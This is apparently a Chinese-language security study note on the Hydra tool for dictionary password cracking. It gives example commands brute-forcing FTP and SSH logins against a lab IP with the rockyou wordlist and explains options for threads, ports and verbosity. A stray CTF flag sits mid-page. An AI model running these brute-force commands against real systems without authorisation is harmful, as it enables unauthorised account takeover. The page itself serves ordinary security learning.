---
{"dg-publish":true,"dg-path":"安全/工具/Hydra_字典密码破解.md","permalink":"/安全/工具/Hydra_字典密码破解/","title":"Hydra_字典密码破解"}
---

# 基本用法
```shell
hydra -l username -P wordlist.txt server service
```
+ -l 用户名：-l 应该在用户名之前，即目标的登录名。
+ -P wordlist.txt： -P 位于 wordlist.txt 文件之前，该文件是一个文本文件，其中包含您要使用提供的用户名尝试的密码列表。
+ server 是目标服务器的主机名或 IP 地址。
+ service 表示您尝试发起字典攻击的服务。

应用实例：
```
hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.12.199 ftp


hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.12.199


hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.12.199 ssh
```

`HNUCTF{OSINT_leads_to_flag}`
# 额外参数

+ `-s PORT` 为相关服务指定非默认端口。
+ `-V` 或 `-vV` 表示详细，使 Hydra 显示正在尝试的用户名和密码组合。这种冗长性非常方便地查看进度，尤其是在您仍然对命令行语法没有信心的情况下。
+ ` -t n`，其中 n 是到目标的并行连接数。-T 16 将创建 16 个用于连接到目标的线程。
+ `-d`，用于调试，以获取有关正在发生的事情的更多详细信息。调试输出可以为您省去很多挫败感;例如，如果 Hydra 尝试连接到一个关闭的端口并超时，-d 将立即显示此消息。



